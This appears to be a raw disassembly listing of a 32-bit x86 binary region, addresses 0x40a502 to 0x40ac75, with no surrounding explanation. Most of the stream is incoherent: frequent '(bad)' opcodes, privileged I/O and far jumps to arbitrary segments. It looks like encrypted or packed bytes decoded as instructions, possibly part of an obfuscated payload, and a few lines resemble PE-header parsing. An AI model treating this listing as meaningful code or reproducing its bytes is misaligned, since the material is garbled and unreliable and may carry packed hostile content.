  40a502:	daa    
  40a503:	mov    ecx,0xbec63378
  40a508:	pop    ebx
  40a509:	test   al,0xc1
  40a50b:	ror    DWORD PTR [ebp+ecx*1+0x288c38be],0x80
  40a513:	pop    esp
  40a514:	inc    edx
  40a515:	push   ecx
  40a516:	jl     0x40a4c2
  40a518:	fdivp  st(1),st
  40a51a:	add    DWORD PTR [edx+0x1f06894],0xffffffbd
  40a521:	repz aas 
  40a523:	inc    eax
  40a524:	int3   
  40a525:	fwait
  40a526:	imul   ebp,DWORD PTR [ecx+0x2a],0xbe3165c8
  40a52d:	out    dx,al
  40a52e:	mov    edx,0xb18bddf0
  40a533:	ret    0xc7c1
  40a536:	adc    BYTE PTR [ebp-0x3d3b36d3],bl
  40a53c:	fsub   DWORD PTR [esi]
  40a53e:	ja     0x40a53f
  40a540:	xchg   edi,eax
  40a541:	mov    ch,BYTE PTR [eax-0x4a2008f7]
  40a547:	aas    
  40a548:	cs mov ebx,0x5da67098
  40a54e:	call   0x1da4:0xef1273ab
  40a555:	in     eax,dx
  40a556:	mov    dl,0x42
  40a558:	mov    bl,0x53
  40a55a:	call   0xfdcef568
  40a55f:	pop    esp
  40a560:	add    edx,ebx
  40a562:	pop    eax
  40a563:	dec    ebp
  40a564:	push   ebx
  40a565:	idiv   edi
  40a567:	stos   BYTE PTR es:[edi],al
  40a568:	xchg   esp,eax
  40a569:	pop    ebx
  40a56a:	jnp    0x40a530
  40a56c:	or     BYTE PTR [ecx],0x89
  40a56f:	push   ebx
  40a570:	pop    ds
  40a571:	inc    esi
  40a572:	in     al,dx
  40a573:	in     al,dx
  40a574:	scas   eax,DWORD PTR es:[edi]
  40a575:	lods   eax,DWORD PTR ds:[esi]
  40a576:	push   esi
  40a577:	sub    eax,0xbf8f4343
  40a57c:	dec    esi
  40a57d:	pop    ss
  40a57e:	or     dl,BYTE PTR [ecx]
  40a580:	dec    eax
  40a581:	jno    0x40a601
  40a583:	jo     0x40a516
  40a585:	ffree  st(1)
  40a587:	push   ebp
  40a588:	dec    edi
  40a589:	fiadd  DWORD PTR [ecx+ebx*4-0x892ef3a]
  40a590:	ror    BYTE PTR [edx],0xb2
  40a593:	cdq    
  40a594:	xor    al,0xd3
  40a596:	loope  0x40a5f1
  40a598:	sbb    edx,DWORD PTR [eax]
  40a59a:	cmp    DWORD PTR [edx-0x6bfbb82c],0xc23b13a7
  40a5a4:	inc    eax
  40a5a5:	fcmovnbe st,st(1)
  40a5a7:	push   0x6eea1ea6
  40a5ac:	popa   
  40a5ad:	sub    al,al
  40a5af:	inc    ecx
  40a5b0:	jo     0x40a54f
  40a5b2:	aaa    
  40a5b3:	sar    DWORD PTR [edi+0x2ad12068],cl
  40a5b9:	(bad)  
  40a5ba:	leave  
  40a5bb:	loop   0x40a62c
  40a5bd:	jmp    edi
  40a5bf:	lods   eax,DWORD PTR ds:[esi]
  40a5c0:	cli    
  40a5c1:	dec    esi
  40a5c2:	mov    al,ds:0x2801dc3
  40a5c7:	mov    bl,0xc5
  40a5c9:	test   eax,0x5750d9b1
  40a5ce:	or     al,BYTE PTR [ecx+0x7f]
  40a5d1:	retf   0x8851
  40a5d4:	popf   
  40a5d5:	pop    eax
  40a5d6:	lods   eax,DWORD PTR ds:[esi]
  40a5d7:	push   ecx
  40a5d8:	test   DWORD PTR [ebx-0x4],ecx
  40a5db:	repz and BYTE PTR [edi+0x8],ah
  40a5df:	sub    esi,edx
  40a5e1:	mov    ah,0xa
  40a5e3:	push   es
  40a5e4:	lock loopne 0x40a56e
  40a5e7:	adc    DWORD PTR [edx-0x6d],0x32
  40a5eb:	loop   0x40a587
  40a5ed:	std    
  40a5ee:	(bad)  
  40a5ef:	outs   dx,DWORD PTR ds:[esi]
  40a5f0:	loope  0x40a617
  40a5f2:	outs   dx,BYTE PTR ds:[esi]
  40a5f3:	push   ss
  40a5f4:	jae    0x40a5d1
  40a5f6:	mov    BYTE PTR [ecx-0x76],al
  40a5f9:	dec    edi
  40a5fa:	aaa    
  40a5fb:	push   esp
  40a5fc:	ret    0xb7c4
  40a5ff:	(bad)  
  40a600:	in     eax,0xe3
  40a602:	inc    esi
  40a603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a604:	cmp    ebx,esp
  40a606:	push   es
  40a607:	push   0x30
  40a609:	pop    ss
  40a60a:	xchg   ebp,eax
  40a60b:	mov    esi,0x643ed6fc
  40a610:	push   cs
  40a611:	xor    al,0x39
  40a613:	ret    0xb623
  40a616:	loope  0x40a694
  40a618:	or     DWORD PTR [eax+0x7f964611],ebx
  40a61e:	cmp    BYTE PTR [esi+edx*8+0x5b],0x8d
  40a623:	sbb    al,0xb5
  40a625:	hlt    
  40a626:	mov    ah,0x86
  40a628:	jne    0x40a67c
  40a62a:	pop    es
  40a62b:	dec    ecx
  40a62c:	jne    0x40a622
  40a62e:	clc    
  40a62f:	mov    bh,BYTE PTR [ebx+edi*4-0x2a]
  40a633:	mov    ah,0xf8
  40a635:	adc    dh,BYTE PTR [esi+0x77]
  40a638:	jg     0x40a675
  40a63a:	xor    esi,0xb090a4da
  40a640:	ds mov bh,0x97
  40a643:	xchg   esi,eax
  40a644:	scas   eax,DWORD PTR es:[edi]
  40a645:	mov    ebp,0xba61b8d1
  40a64a:	arpl   bp,sp
  40a64c:	add    al,0x9d
  40a64e:	stc    
  40a64f:	and    al,0xd
  40a651:	jnp    0x40a5fa
  40a653:	jno    0x40a623
  40a655:	pop    es
  40a656:	ret    
  40a657:	push   ebp
  40a658:	add    eax,0x651f5a5d
  40a65d:	imul   ebx,eax,0xffffff84
  40a660:	cmp    bh,BYTE PTR [esi+0x1bb4dc3e]
  40a666:	(bad)  
  40a668:	and    BYTE PTR [edi-0x5f6a4efa],bl
  40a66e:	xchg   ecx,eax
  40a66f:	test   al,0x29
  40a671:	mov    ds:0x31b73f65,eax
  40a676:	les    esi,FWORD PTR [ebx+ecx*1+0x7c]
  40a67a:	fidiv  DWORD PTR [ecx]
  40a67c:	xchg   edi,eax
  40a67d:	dec    ebx
  40a67e:	xor    bh,BYTE PTR [eax+0x11]
  40a681:	rcl    BYTE PTR [esi+eiz*4],cl
  40a684:	jae    0x40a65e
  40a686:	test   al,0xca
  40a688:	mov    cl,0xb8
  40a68a:	add    bh,BYTE PTR [esi-0x35]
  40a68d:	sub    BYTE PTR [edi],bl
  40a68f:	lods   eax,DWORD PTR ds:[esi]
  40a690:	cmp    DWORD PTR [esi-0x39661d9f],esp
  40a696:	mov    ebx,0xbabefce5
  40a69b:	loop   0x40a700
  40a69d:	mov    edx,0x40664727
  40a6a2:	lock enter 0x3999,0xf8
  40a6a7:	div    BYTE PTR [esi]
  40a6a9:	jb     0x40a63c
  40a6ab:	sti    
  40a6ac:	(bad)  
  40a6ad:	cmc    
  40a6ae:	hlt    
  40a6af:	cmp    ah,ah
  40a6b1:	push   ss
  40a6b2:	cmp    BYTE PTR [ecx+0x66],ch
  40a6b5:	shr    DWORD PTR ds:0x86135fbd,0xa
  40a6bc:	xchg   esp,eax
  40a6bd:	sbb    DWORD PTR [ecx],ebp
  40a6bf:	mov    dh,0xab
  40a6c1:	sti    
  40a6c2:	pop    esp
  40a6c3:	call   0x98902583
  40a6c8:	push   ss
  40a6c9:	ins    DWORD PTR es:[edi],dx
  40a6ca:	fdiv   st,st(5)
  40a6cc:	lods   al,BYTE PTR ds:[esi]
  40a6cd:	xlat   BYTE PTR ds:[ebx]
  40a6ce:	cdq    
  40a6cf:	icebp  
  40a6d0:	aaa    
  40a6d1:	pop    es
  40a6d2:	inc    edi
  40a6d3:	out    dx,al
  40a6d4:	out    dx,al
  40a6d5:	jg     0x40a700
  40a6d7:	mov    esi,0x302e086
  40a6dc:	(bad)  
  40a6dd:	jmp    0x40a9fe
  40a6e2:	in     eax,0x96
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4-0x3]
  40a6ef:	jecxz  0x40a699
  40a6f1:	scas   al,BYTE PTR es:[edi]
  40a6f2:	js     0x40a6dd
  40a6f4:	jle    0x40a774
  40a6f6:	jp     0x40a775
  40a6f8:	jle    0x40a778
  40a6fa:	mul    DWORD PTR [ebp+0x67]
  40a6fd:	push   0xffffffc7
  40a6ff:	adc    BYTE PTR [eax],cl
  40a701:	ficom  DWORD PTR [ebp-0x3e983c7b]
  40a707:	jmp    0x72b0:0x9352c577
  40a70e:	inc    eax
  40a70f:	inc    eax
  40a710:	mov    edx,0x34de4188
  40a715:	adc    ebp,esp
  40a717:	pop    ebp
  40a718:	sub    DWORD PTR [esi+0x4a],esi
  40a71b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a71c:	outs   dx,BYTE PTR ds:[esi]
  40a71d:	inc    esi
  40a71e:	in     eax,0xb8
  40a720:	mov    esi,es
  40a722:	ror    DWORD PTR [ebx],cl
  40a724:	aas    
  40a725:	or     eax,0x9f8317fb
  40a72a:	sub    bl,0x2e
  40a72d:	in     eax,0x37
  40a72f:	inc    esp
  40a730:	cmp    ebp,DWORD PTR ds:0xdbb0904
  40a736:	lds    esp,FWORD PTR ds:0xa6889ab3
  40a73c:	jns    0x40a76f
  40a73e:	mov    esi,0xa9ff2bb7
  40a743:	enter  0x9d8f,0x76
  40a747:	enter  0xc6f9,0x9b
  40a74b:	cmp    al,0xde
  40a74d:	sub    eax,0x9ff7477e
  40a752:	inc    esp
  40a753:	sti    
  40a754:	call   0xc91fc99b
  40a759:	fdivr  QWORD PTR [eax+ebx*1+0x19]
  40a75d:	and    BYTE PTR [edi+edx*1-0x7d88404b],dh
  40a764:	enter  0x1141,0x38
  40a768:	mov    dl,0xc1
  40a76a:	sub    dh,BYTE PTR [edx-0x44]
  40a76d:	loop   0x40a7e7
  40a76f:	adc    al,0x9c
  40a771:	and    eax,edi
  40a773:	cmc    
  40a774:	in     eax,dx
  40a775:	shr    DWORD PTR [edi-0x7f935e58],0x88
  40a77c:	call   0x676cc9c9
  40a781:	xchg   ecx,eax
  40a782:	mov    ds:0x185f8fa0,eax
  40a787:	out    dx,al
  40a788:	cld    
  40a789:	lock sar BYTE PTR [edi-0x62cd2712],1
  40a790:	or     ah,cl
  40a792:	hlt    
  40a793:	retf   0x16e
  40a796:	popf   
  40a797:	shl    BYTE PTR [ebx-0x39e99651],cl
  40a79d:	mov    DWORD PTR [ecx+0x2b],ebp
  40a7a0:	inc    ebp
  40a7a1:	dec    ebx
  40a7a2:	xchg   edx,eax
  40a7a3:	sub    BYTE PTR [ecx-0x166b0c4d],ah
  40a7a9:	push   esp
  40a7aa:	push   0x69c6f138
  40a7af:	and    bh,dh
  40a7b1:	adc    cl,BYTE PTR [edi]
  40a7b3:	imul   eax,DWORD PTR [edi-0x37],0xc708049
  40a7ba:	jno    0x40a790
  40a7bc:	dec    ebp
  40a7bd:	sub    BYTE PTR [edi],ch
  40a7bf:	sub    BYTE PTR [ecx-0x4],ah
  40a7c2:	cmp    eax,0x5e889d30
  40a7c7:	clc    
  40a7c8:	popa   
  40a7c9:	dec    edx
  40a7ca:	or     BYTE PTR [ebx-0x192487ef],dh
  40a7d0:	ins    BYTE PTR es:[edi],dx
  40a7d1:	dec    edi
  40a7d2:	mov    ds:0x60b1ec26,al
  40a7d7:	sub    esp,DWORD PTR [edx]
  40a7d9:	sub    al,ah
  40a7db:	adc    bh,BYTE PTR [esi]
  40a7dd:	jb     0x40a80e
  40a7df:	xor    BYTE PTR [edi+0x3c78221],bh
  40a7e5:	push   cs
  40a7e6:	fnstenv [edx+0x27]
  40a7e9:	mov    ds:0xd4de0ae6,eax
  40a7ee:	mov    BYTE PTR [esi+0x2602d976],bh
  40a7f4:	jmp    0xb850:0x6df1b4e4
  40a7fb:	into   
  40a7fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7fd:	mov    BYTE PTR [eax+0x4d02bcc2],cl
  40a803:	sbb    esi,DWORD PTR [ebx+eiz*4-0xf]
  40a807:	push   ebp
  40a808:	jbe    0x40a7c9
  40a80a:	sti    
  40a80b:	adc    ah,ch
  40a80d:	adc    cl,ch
  40a80f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a810:	sar    BYTE PTR [ebp+0x55],cl
  40a813:	mov    bh,0x4b
  40a815:	inc    edi
  40a816:	mov    ch,cl
  40a818:	hlt    
  40a819:	push   cs
  40a81a:	fbld   TBYTE PTR [ebx-0xa]
  40a81d:	stos   BYTE PTR es:[edi],al
  40a81e:	mov    al,dl
  40a820:	setl   ch
  40a823:	mov    dl,0x8e
  40a825:	mov    ebx,0x1b53ba02
  40a82a:	dec    eax
  40a82b:	fstp   DWORD PTR ds:0xd9475ae4
  40a831:	xor    eax,0x6d67c2a2
  40a836:	xchg   ebp,eax
  40a837:	xor    esp,DWORD PTR ds:0x914f70f6
  40a83d:	cmp    eax,0xb9cdd5a0
  40a842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a843:	mov    ebx,0x7388140e
  40a848:	pop    ds
  40a849:	mov    eax,0xcfc41b46
  40a84e:	xor    dh,dh
  40a850:	repnz aam 0x3a
  40a853:	popf   
  40a854:	and    al,0xb3
  40a856:	mov    WORD PTR [ebx+edx*2+0x7],ss
  40a85a:	enter  0xe219,0xd8
  40a85e:	mov    eax,ds:0xde069980
  40a863:	lahf   
  40a864:	jbe    0x40a7f1
  40a866:	sti    
  40a867:	push   edi
  40a868:	mov    ebp,0xf2ff077a
  40a86d:	xchg   edi,eax
  40a86e:	push   0x26f38056
  40a873:	inc    edx
  40a874:	jmp    0x40a8bd
  40a876:	pop    ds
  40a877:	repnz mov dl,0x69
  40a87a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a87b:	pop    edx
  40a87c:	push   ecx
  40a87d:	push   cs
  40a87e:	or     ecx,DWORD PTR [edx-0x3d5a40e3]
  40a884:	xor    DWORD PTR [edx-0x14],ebx
  40a887:	dec    eax
  40a888:	hlt    
  40a889:	sub    cl,BYTE PTR [edi]
  40a88b:	minps  xmm2,XMMWORD PTR [ecx+0x4d2c0af9]
  40a892:	xor    esi,DWORD PTR [esi]
  40a894:	and    eax,0x7064aceb
  40a899:	sbb    DWORD PTR [ebx+0x2e5845d8],ebp
  40a89f:	push   edi
  40a8a0:	repnz mov ah,0x39
  40a8a3:	cmc    
  40a8a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8a6:	cmp    DWORD PTR [esi+ecx*2],esi
  40a8a9:	dec    ebp
  40a8aa:	mov    al,0x4e
  40a8ac:	lahf   
  40a8ad:	imul   ah
  40a8af:	sub    eax,0xd6ed6206
  40a8b4:	push   0x3fcd524a
  40a8b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8ba:	cwde   
  40a8bb:	imul   esi,eax,0xf
  40a8be:	outs   dx,BYTE PTR ds:[esi]
  40a8bf:	dec    ecx
  40a8c0:	(bad)  
  40a8c1:	cmp    al,0x19
  40a8c3:	jno    0x40a91f
  40a8c5:	sahf   
  40a8c6:	xor    DWORD PTR [edi+eiz*8-0x1f],ebx
  40a8ca:	(bad)  
  40a8cc:	pop    edi
  40a8cd:	repnz shl BYTE PTR [edx-0x11],0x6a
  40a8d2:	repnz xchg esp,eax
  40a8d4:	test   al,0xaf
  40a8d6:	sar    DWORD PTR [esi-0x448eab51],1
  40a8dc:	fisubr DWORD PTR [eax-0x1de2537b]
  40a8e2:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8e4:	loopne 0x40a87d
  40a8e6:	jne    0x40a963
  40a8e8:	xchg   esp,eax
  40a8e9:	aas    
  40a8ea:	push   ds
  40a8eb:	imul   BYTE PTR [eax+0x25a013ce]
  40a8f1:	cmp    BYTE PTR [ebx+0x51],bl
  40a8f4:	(bad)  
  40a8f5:	les    esi,FWORD PTR [ecx]
  40a8f7:	cwde   
  40a8f8:	inc    edx
  40a8f9:	fwait
  40a8fa:	lods   eax,DWORD PTR ds:[esi]
  40a8fb:	sbb    BYTE PTR [edx-0x7bf76296],0x83
  40a902:	aaa    
  40a903:	push   edx
  40a904:	xchg   BYTE PTR [edx+eax*8],bh
  40a907:	fcom   QWORD PTR [ebx-0x727334fc]
  40a90d:	stos   BYTE PTR es:[edi],al
  40a90e:	div    esi
  40a910:	es test cl,0x73
  40a914:	jge    0x40a8c0
  40a916:	push   ds
  40a917:	mov    ebx,0x2c385f
  40a91c:	jnp    0x40a90d
  40a91e:	pop    ebx
  40a91f:	mov    cs,WORD PTR [eax-0x30f1563a]
  40a925:	or     eax,0x335cf438
  40a92a:	pop    ss
  40a92b:	push   ss
  40a92c:	ret    
  40a92d:	mov    al,ds:0x1b0bdfe4
  40a932:	jne    0x40a96d
  40a934:	or     eax,0xfd7f0c4c
  40a939:	aad    0x56
  40a93b:	xlat   BYTE PTR ds:[ebx]
  40a93c:	cli    
  40a93d:	mov    ah,0x3
  40a93f:	mov    al,ds:0x91029c06
  40a944:	call   0xbbce562e
  40a949:	addr16 inc ecx
  40a94b:	push   ecx
  40a94c:	cwde   
  40a94d:	mov    esp,0x24ccca0a
  40a952:	(bad)
  40a956:	fsub   DWORD PTR [edx+0x691f7fa5]
  40a95c:	mov    ebx,0x7abb14e8
  40a961:	es cmp ch,ch
  40a964:	cdq    
  40a965:	inc    esi
  40a966:	into   
  40a967:	xor    ebp,eax
  40a969:	retf   0xa1f6
  40a96c:	int    0x5b
  40a96e:	mov    ebx,0x8d3b94b6
  40a973:	xchg   edi,eax
  40a974:	mov    ebp,0xaf0a31
  40a979:	aad    0xef
  40a97b:	ret    
  40a97c:	mov    al,ds:0xc0561813
  40a981:	sub    bl,BYTE PTR [ecx]
  40a983:	fnstsw WORD PTR [edx+0x2f]
  40a986:	inc    edx
  40a987:	shl    eax,1
  40a989:	and    cl,BYTE PTR [ebx+0xb28b2bb]
  40a98f:	shr    DWORD PTR [ebp-0x47],0xc8
  40a993:	dec    esp
  40a994:	leave  
  40a995:	pop    es
  40a996:	jbe    0x40a945
  40a998:	in     eax,0xd5
  40a99a:	popa   
  40a99b:	cmp    edx,0xffffffc8
  40a99e:	inc    ecx
  40a99f:	das    
  40a9a0:	dec    ebp
  40a9a1:	stos   DWORD PTR es:[edi],eax
  40a9a2:	aam    0x3e
  40a9a4:	clc    
  40a9a5:	sbb    eax,0x5edecd7b
  40a9aa:	pusha  
  40a9ab:	add    eax,0x2fefc2b4
  40a9b0:	jbe    0x40aa17
  40a9b2:	shl    DWORD PTR [ebx],cl
  40a9b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9b5:	lahf   
  40a9b6:	adc    bl,ch
  40a9b8:	mov    ch,0xaa
  40a9ba:	idiv   BYTE PTR [ebx+0x4480c5db]
  40a9c0:	gs inc ecx
  40a9c2:	or     eax,0xdbd791a5
  40a9c7:	lds    ebp,FWORD PTR [ebp-0x70]
  40a9ca:	xchg   edx,eax
  40a9cb:	adc    cl,bh
  40a9cd:	ds dec ebx
  40a9cf:	mov    cs,WORD PTR [edx-0x17]
  40a9d2:	scas   eax,DWORD PTR es:[edi]
  40a9d3:	push   ss
  40a9d4:	neg    DWORD PTR [edx]
  40a9d6:	cwde   
  40a9d7:	or     eax,0xafddd209
  40a9dc:	xchg   ecx,eax
  40a9dd:	xchg   edx,eax
  40a9de:	pop    edi
  40a9df:	jae    0x40aa2f
  40a9e1:	pop    ebx
  40a9e2:	loop   0x40aa14
  40a9e4:	ds (bad) 
  40a9e6:	and    esp,esi
  40a9e8:	xor    DWORD PTR [edi+edi*1+0x2142832d],esi
  40a9ef:	(bad)  
  40a9f0:	mov    edx,0x3283bf04
  40a9f5:	loopne 0x40a978
  40a9f7:	push   esi
  40a9f8:	icebp  
  40a9f9:	mov    BYTE PTR [ecx+0x39f3ce01],bh
  40a9ff:	add    DWORD PTR [edi],ecx
  40aa01:	test   BYTE PTR [edx],ah
  40aa03:	adc    BYTE PTR [eax],al
  40aa05:	add    BYTE PTR [ebx+0x458bec4d],cl
  40aa0b:	clc    
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    DWORD PTR ds:0x4d35556,ebx
  40aa2e:	hlt    
  40aa2f:	jle    0x40aaaf
  40aa31:	jp     0x40aab0
  40aa33:	jle    0x40aab3
  40aa35:	cdq    
  40aa36:	js     0x40aa26
  40aa38:	cdq    
  40aa39:	nop
  40aa3a:	(bad)  
  40aa3b:	nop
  40aa3c:	std    
  40aa3d:	hlt    
  40aa3e:	push   ecx
  40aa3f:	leave  
  40aa40:	jne    0x40aa1a
  40aa42:	call   0xed70ed1a
  40aa47:	mov    ch,0x40
  40aa49:	push   ss
  40aa4a:	pop    esp
  40aa4b:	ret    
  40aa4c:	stos   BYTE PTR es:[edi],al
  40aa4d:	sbb    eax,0xdf344fea
  40aa52:	loopne 0x40aa0e
  40aa54:	ror    DWORD PTR [ebp+0x43],cl
  40aa57:	retf   
  40aa58:	in     eax,0x83
  40aa5a:	mov    al,ds:0xc1d65d3
  40aa5f:	ja     0x40aa83
  40aa61:	jae    0x40aa1d
  40aa63:	xor    DWORD PTR [ecx-0x7ae26546],ecx
  40aa69:	adc    BYTE PTR [ebx+0x57],ch
  40aa6c:	sbb    al,0xe6
  40aa6e:	std    
  40aa6f:	call   0x7cc5b1cc
  40aa74:	sub    DWORD PTR [ebp+0x5],eax
  40aa77:	call   0x43fcb589
  40aa7c:	int3   
  40aa7d:	jbe    0x40aa73
  40aa7f:	ret    
  40aa80:	and    DWORD PTR [ecx+0x174d9e53],esp
  40aa86:	mov    edx,eax
  40aa88:	(bad)  
  40aa89:	mov    esi,0xed4702ca
  40aa8e:	push   edx
  40aa8f:	sub    bh,bl
  40aa91:	cmp    al,0xc3
  40aa93:	pop    ecx
  40aa94:	inc    edx
  40aa95:	push   esp
  40aa96:	mov    ch,0x94
  40aa98:	sub    al,ch
  40aa9a:	pop    eax
  40aa9b:	push   ebp
  40aa9c:	mov    dl,0xeb
  40aa9e:	clc    
  40aa9f:	push   ebx
  40aaa0:	push   ds
  40aaa1:	loop   0x40aa2b
  40aaa3:	inc    ebx
  40aaa4:	fs pop ebx
  40aaa6:	cmp    BYTE PTR [eax+0x49],bh
  40aaa9:	loope  0x40aa5a
  40aaab:	adc    BYTE PTR [ecx],dh
  40aaad:	call   0xf7a1:0x992078a6
  40aab4:	push   ss
  40aab5:	push   0x5bdac68
  40aaba:	loopne 0x40aa40
  40aabc:	dec    esi
  40aabd:	adc    BYTE PTR [eax-0x22],bl
  40aac0:	addr16 mov bx,0x83ac
  40aac5:	sub    DWORD PTR [eax-0x22],0xffffffae
  40aac9:	scas   eax,DWORD PTR es:[edi]
  40aaca:	retf   0x30e6
  40aacd:	(bad)  
  40aace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aacf:	les    edx,FWORD PTR [edx+0x2d]
  40aad2:	out    dx,al
  40aad3:	xlat   BYTE PTR ds:[ebx]
  40aad4:	int    0x91
  40aad6:	xor    BYTE PTR [edx+edx*1-0x73],ah
  40aada:	mov    ds:0x9adf4c7a,al
  40aadf:	outs   dx,DWORD PTR ds:[esi]
  40aae0:	in     al,0xa1
  40aae2:	jl     0x40aa98
  40aae4:	adc    ebp,edi
  40aae6:	add    ebp,DWORD PTR [esp+ebp*2-0x75]
  40aaea:	push   ebp
  40aaeb:	push   ebx
  40aaec:	not    DWORD PTR [edi]
  40aaee:	xor    eax,0xcd61646a
  40aaf3:	push   0x2b91cbfe
  40aaf8:	add    al,0x9a
  40aafa:	pushf  
  40aafb:	icebp  
  40aafc:	inc    esp
  40aafd:	int3   
  40aafe:	sbb    edi,ebx
  40ab00:	sbb    ebp,edx
  40ab02:	add    ecx,0x1fd5a21f
  40ab08:	jns    0x40ab6c
  40ab0a:	rcl    DWORD PTR [eax-0xa],cl
  40ab0d:	sbb    ch,BYTE PTR [esi-0x34]
  40ab10:	add    al,0xac
  40ab12:	xchg   BYTE PTR [edi+0x3a],bh
  40ab15:	rcl    DWORD PTR [edx+edi*8+0x4dbff64e],cl
  40ab1c:	in     al,dx
  40ab1d:	fs inc ebp
  40ab1f:	mov    WORD PTR [ecx],es
  40ab21:	mov    bl,0x39
  40ab23:	std    
  40ab24:	fs jg  0x40ab5e
  40ab27:	dec    ebp
  40ab28:	ret    
  40ab29:	test   al,0x99
  40ab2b:	fwait
  40ab2c:	lahf   
  40ab2d:	test   al,0xd5
  40ab2f:	xchg   ebx,eax
  40ab30:	enter  0xb5ad,0xb5
  40ab34:	or     edx,edi
  40ab36:	mov    BYTE PTR [ebp-0x69],cl
  40ab39:	adc    BYTE PTR [ecx-0xde43651],al
  40ab3f:	sub    eax,0x9df372fc
  40ab44:	fadd   QWORD PTR [ebp-0x7d]
  40ab47:	lea    ebp,[ecx]
  40ab49:	fbld   TBYTE PTR [eax+0x1682371d]
  40ab4f:	outs   dx,DWORD PTR ds:[esi]
  40ab50:	repz mov esi,DWORD PTR fs:[eax]
  40ab54:	mov    ds:0x31337265,al
  40ab59:	addr16 jns 0x40abb8
  40ab5c:	ins    BYTE PTR es:[edi],dx
  40ab5d:	sbb    edx,DWORD PTR [edi-0x1051a7cc]
  40ab63:	stc    
  40ab64:	jno    0x40ab7b
  40ab66:	jbe    0x40aafd
  40ab68:	mov    ds,WORD PTR [ecx]
  40ab6a:	div    BYTE PTR [edx-0x48412fb0]
  40ab70:	int    0x87
  40ab72:	lds    ebp,FWORD PTR [esi-0x4ffc566a]
  40ab78:	or     BYTE PTR [edx+eax*1-0x52],0x52
  40ab7d:	xchg   ebp,eax
  40ab7e:	inc    ecx
  40ab7f:	not    DWORD PTR [ecx]
  40ab81:	fcmovb st,st(4)
  40ab83:	leave  
  40ab84:	add    edx,0xffffff96
  40ab87:	or     DWORD PTR [ebx+esi*2],ebp
  40ab8a:	ror    ch,0xf3
  40ab8d:	cli    
  40ab8e:	jecxz  0x40ac0f
  40ab90:	ss icebp 
  40ab92:	dec    ebx
  40ab93:	ds iret 
  40ab95:	bound  esi,QWORD PTR [eax]
  40ab97:	xchg   edi,eax
  40ab98:	lock jle 0x40ac04
  40ab9b:	adc    cl,BYTE PTR [eax+0x64]
  40ab9e:	cmp    al,0x5b
  40aba0:	add    al,0xd4
  40aba2:	leave  
  40aba3:	in     al,dx
  40aba4:	call   0xde41:0x50a37a72
  40abab:	xchg   esi,eax
  40abac:	pop    esi
  40abad:	aas    
  40abae:	sub    bh,BYTE PTR [ecx-0x5b255495]
  40abb4:	(bad)  [edx]
  40abb6:	mov    esi,0xb18d99ae
  40abbb:	push   eax
  40abbc:	cli    
  40abbd:	mov    edx,0x19743fb2
  40abc2:	xchg   esp,eax
  40abc3:	sbb    bh,BYTE PTR [ebx+0x27]
  40abc6:	xor    DWORD PTR [ecx+0xd],edx
  40abc9:	dec    esi
  40abca:	mov    ecx,0x13eb987f
  40abcf:	add    DWORD PTR [eax+0x5c538e0f],ebx
  40abd5:	fimul  DWORD PTR [ebp+0x573d35d1]
  40abdb:	adc    DWORD PTR [edx+0x23],edx
  40abde:	push   cs
  40abdf:	repz pop esp
  40abe1:	cld    
  40abe2:	sub    al,0xb8
  40abe4:	dec    ebp
  40abe5:	push   ds
  40abe6:	ins    DWORD PTR es:[edi],dx
  40abe7:	dec    edi
  40abe8:	cmp    eax,0xb087c8b4
  40abed:	ror    DWORD PTR [ecx+0xde2b43f],1
  40abf3:	inc    ebp
  40abf4:	test   eax,0xe2c22546
  40abf9:	push   ss
  40abfa:	and    BYTE PTR [edx+0x3ff3f4ef],cl
  40ac00:	pop    edx
  40ac01:	xchg   ecx,eax
  40ac02:	outs   dx,BYTE PTR ds:[esi]
  40ac03:	je     0x40ab98
  40ac05:	int    0xcd
  40ac07:	or     BYTE PTR [esi-0x4b70cfdd],cl
  40ac0d:	dec    esp
  40ac0e:	add    cl,BYTE PTR [edx-0x7dc509a1]
  40ac14:	cli    
  40ac15:	and    esp,ebp
  40ac17:	mov    al,ds:0xab63ba3d
  40ac1c:	into   
  40ac1d:	imul   BYTE PTR [ebp+eax*4+0x38]
  40ac21:	xchg   edx,eax
  40ac22:	sbb    DWORD PTR [ecx-0xce873aa],ebp
  40ac28:	push   edx
  40ac29:	out    0xe8,al
  40ac2b:	cdq    
  40ac2c:	push   0x3d
  40ac2e:	imul   ebp,ecx,0x25
  40ac31:	adc    eax,0xb9dcc817
  40ac36:	pusha  
  40ac37:	jo     0x40ac9b
  40ac39:	push   0xebf697bd
  40ac3e:	sub    al,0x11
  40ac40:	fidiv  DWORD PTR gs:[ebp+0x1269c192]
  40ac47:	jno    0x40aca3
  40ac49:	and    al,0x7c
  40ac4b:	jmp    0xce87:0xad3b32af
  40ac52:	jmp    0x40ac43
  40ac54:	adc    bx,WORD PTR [eax+0x67]
  40ac58:	ins    DWORD PTR es:[edi],dx
  40ac59:	mul    DWORD PTR [ebx+0x5a538227]
  40ac5f:	bound  eax,QWORD PTR [esi]
  40ac61:	adc    dl,BYTE PTR [edx+0x36]
  40ac64:	mov    ds:0x13670714,al
  40ac69:	fldenv [ecx]
  40ac6b:	mov    ah,BYTE PTR [esi+0x3a]
  40ac6e:	das    
  40ac6f:	sub    cl,BYTE PTR [ecx+0x1c8ba3f6]
  40ac75:	dec    ebx
